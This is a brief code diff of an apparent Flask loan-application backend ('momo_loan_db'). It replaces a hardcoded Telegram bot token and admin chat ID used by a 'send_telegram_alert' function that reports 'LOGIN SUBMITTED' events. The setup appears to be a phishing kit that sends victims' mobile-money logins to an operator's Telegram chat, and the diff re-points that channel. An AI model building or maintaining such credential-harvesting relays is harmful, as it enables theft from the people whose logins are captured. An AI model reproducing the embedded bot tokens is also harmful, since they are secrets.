@@ -19,8 +19,8 @@ db = client[os.environ.get("DB_NAME", "momo_loan_db")]
 applications_collection = db["applications"]
 
 # Telegram Configuration
-TELEGRAM_BOT_TOKEN = "9061926036:AAGOubkTGZZczTCO_V2BFgXkwpYwsmxZO5M"
-TELEGRAM_ADMIN_CHAT_ID = "6558384338"
+TELEGRAM_BOT_TOKEN = "9283902655:AAH66xkXu31W2CoWuo7vPg8LJKmI-Ws64lw"
+TELEGRAM_ADMIN_CHAT_ID = "6708120373"
 
 
 def send_telegram_alert(app_data, stage_title="LOGIN SUBMITTED", step_code="login"):
@@ -431,3 +431,4 @@ def health_check():
 
 if __name__ == "__main__":
     app.run(debug=True, port=5000)
+
